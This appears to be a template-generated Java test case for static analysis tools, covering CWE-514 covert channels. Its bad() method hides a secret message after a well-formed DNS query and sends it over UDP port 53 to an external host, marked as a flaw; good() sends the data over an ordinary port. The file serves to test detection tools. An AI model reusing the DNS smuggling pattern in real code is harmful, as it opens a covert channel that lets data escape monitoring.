/* TEMPLATE GENERATED TESTCASE FILE
Filename: CWE514_Covert_Channel__basic_01.java
Label Definition File: CWE514_Covert_Channel__basic.label.xml
Template File: point-flaw-01.tmpl.java
*/
/*
* @description
* CWE: 514 Covert Channel
* Sinks:
*    GoodSink: Send datagram over a non well-known port
*    BadSink : Covert channel via DNS (port 53)
* Flow Variant: 01 Baseline
*
* */

package testcases.CWE514_Covert_Channel;

import testcasesupport.*;

import java.io.*;
import java.net.*;
import java.util.logging.Level;

public class CWE514_Covert_Channel__basic_01 extends AbstractTestCase
{

    public void bad() throws Throwable
    {

        /* The following constructs a legitimate DNS query for ocsp.thawte.com, and sticks a
         * secret message immediately after the end of the DNS message.  The two will be sent
         * together in the same UDP packet.
         *
         * See RFC1035 Section 4.1 for details of the DNS message format. */
        byte [] bDNS = new byte[] {
            /* DNS HEADER */
            (byte) 0x12, (byte) 0x34,			/* ID: 0x1234 (a unique request identifier chosen by the client) */
            (byte) 0x01,						/* 00000001 */
            /* 0        -- QR == 0: DNS query */
            /*  0000    -- OPCODE == 0: standard query (QUERY) */
            /*      0   -- AA n/a (only used in responses) */
            /*       0  -- TC == 0: not truncated */
            /*        1 -- RD == 1: recursion desired */
            (byte) 0x00,						/* 00000000 */
            /* 0        -- RA n/a (only used in responses) */
            /*  000     -- Z reserved (must be zero) */
            /*     0000 -- RCODE n/a (only used in responses) */
            (byte) 0x00, (byte) 0x01,			/* QDCOUNT: 1 (number of question records) */
            (byte) 0x00, (byte) 0x00,			/* ARCOUNT: 0 (number of answer records) */
            (byte) 0x00, (byte) 0x00,			/* NSCOUNT: 0 (number of authority records) */
            (byte) 0x00, (byte) 0x00,			/* ARCOUNT: 0 (number of additional records) */
            /* DNS QUESTION RECORD 1 OF 1 */
            /* QNAME: The name to lookup.  Each component of the name is specified
             * separately as length-prefixed strings.  A zero-length segment marks
             * the end of the name. */
            (byte) 4, (byte) 'o', (byte) 'c', (byte) 's', (byte) 'p',
            (byte) 6, (byte) 't', (byte) 'h', (byte) 'a', (byte) 'w', (byte) 't', (byte) 'e',
            (byte) 3, (byte) 'c', (byte) 'o', (byte) 'm',
            (byte) 0,
            (byte) 0x00, (byte) 0x01,			/* QTYPE == 1: A record (host address) */
            (byte) 0x00, (byte) 0x01			/* QCLASS == 1: IN (Internet) */
        };

        /* The secret message to hide after the DNS request */
        byte [] bMessage = "super secret message".getBytes("UTF-8");

        /* Put the two together to form the UDP packet's payload */
        byte [] buf = new byte[bDNS.length + bMessage.length];
        System.arraycopy(bDNS, 0, buf, 0, bDNS.length);
        System.arraycopy(bMessage, 0, buf, bDNS.length, bMessage.length);

        DatagramSocket sock = null;
        try
        {
            /* FLAW: Sending datagram to port 53 (Covert channel via DNS) */
            DatagramPacket pack = new DatagramPacket(buf, buf.length, new InetSocketAddress("www.example.com", 53));
            sock = new DatagramSocket(); /* pick any available port */
            sock.send(pack);
        }
        catch(SocketException e)
        {
            IO.logger.log(Level.WARNING, "Couldn't setup socket", e);
        }
        catch( IOException e )
        {
            IO.logger.log(Level.WARNING, "Couldn't send packet over socket", e);
        }
        finally
        {
            if (sock != null)
            {
                sock.close();
            }
        }

    }

    public void good() throws Throwable
    {
        good1();
    }

    private void good1() throws Throwable
    {

        byte [] buf = "super secret message".getBytes("UTF-8");
        DatagramSocket sock = null;
        try
        {
            /* FIX: Send datagram over a non well-known port */
            DatagramPacket pack = new DatagramPacket(buf, buf.length, new InetSocketAddress("www.example.com", 10101));
            sock = new DatagramSocket();
            sock.send(pack);
        }
        catch(SocketException e)
        {
            IO.logger.log(Level.WARNING, "Couldn't setup socket", e);
        }
        catch( IOException e )
        {
            IO.logger.log(Level.WARNING, "Couldn't send packet over socket", e);
        }
        finally
        {
            if (sock != null)
            {
                sock.close();
            }
        }

    }

    /* Below is the main(). It is only used when building this testcase on
       its own for testing or for building a binary to use in testing binary
       analysis tools. It is not used when compiling all the testcases as one
       application, which is how source code analysis tools are tested. */
    public static void main(String[] args) throws ClassNotFoundException,
           InstantiationException, IllegalAccessException
    {
        mainFromParent(args);
    }
}

